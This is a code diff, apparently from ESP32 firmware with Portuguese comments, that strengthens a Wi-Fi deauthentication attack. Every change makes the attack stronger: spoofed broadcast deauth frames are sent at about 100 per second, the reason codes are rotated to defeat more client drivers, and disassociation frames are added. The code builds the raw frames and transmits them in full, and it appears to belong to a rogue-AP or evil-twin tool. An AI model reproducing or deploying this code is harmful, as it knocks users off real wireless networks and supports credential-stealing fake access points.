@@ -117,9 +117,9 @@ public:
 
     void tick() {
         if (!running) return;
-        // Deauth loop: envia deauth ao broadcast no canal do AP real a cada 500ms
-        if (cfg.deauthLoop && millis() - _lastDeauth > 500) {
-            _deauthTarget();
+        // Deauth agressivo: 20 frames a cada 200ms (~100 frames/s)
+        if (cfg.deauthLoop && millis() - _lastDeauth > 200) {
+            for (int i = 0; i < 4; i++) _deauthTarget();
             _lastDeauth = millis();
         }
     }
@@ -296,20 +296,26 @@ private:
     // ── Deauth do AP real ─────────────────────────────────────────────────────
 
     void _deauthTarget() {
-        // Deauth broadcast: desconecta todos clientes do AP real
-        uint8_t frame[26] = {};
-        frame[0] = 0xC0; frame[1] = 0x00; // Deauth
-        frame[2] = 0x3A; frame[3] = 0x01; // Duration
-        // DA = broadcast
-        memset(frame + 4, 0xFF, 6);
-        // SA = BSSID do AP real (spoofado)
-        memcpy(frame + 10, cfg.bssid, 6);
-        memcpy(frame + 16, cfg.bssid, 6);
-        frame[24] = 0x07; frame[25] = 0x00; // reason: class 3 frame received
-
         esp_wifi_set_channel(cfg.channel, WIFI_SECOND_CHAN_NONE);
-        for (int i = 0; i < 5; i++)
-            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        // Varia reason codes para cobrir mais drivers de cliente
+        static const uint8_t reasons[] = {0x01,0x02,0x03,0x07,0x08};
+        static uint8_t ri = 0;
+        uint8_t reason = reasons[(ri++) % 5];
+
+        // AP → broadcast (desconecta todos clientes)
+        uint8_t frame[26] = {};
+        frame[0] = 0xC0; frame[1] = 0x00;
+        frame[2] = 0x3A; frame[3] = 0x01;
+        memcpy(frame + 4,  bcast,     6); // DA
+        memcpy(frame + 10, cfg.bssid, 6); // SA = AP real (spoofado)
+        memcpy(frame + 16, cfg.bssid, 6); // BSSID
+        frame[24] = reason; frame[25] = 0x00;
+        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
+
+        // Disassoc broadcast também (força estado ASSOC=0)
+        frame[0] = 0xA0;
+        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
     }
 
     // ── Utilidades ─────────────────────────────────────────────────────────────
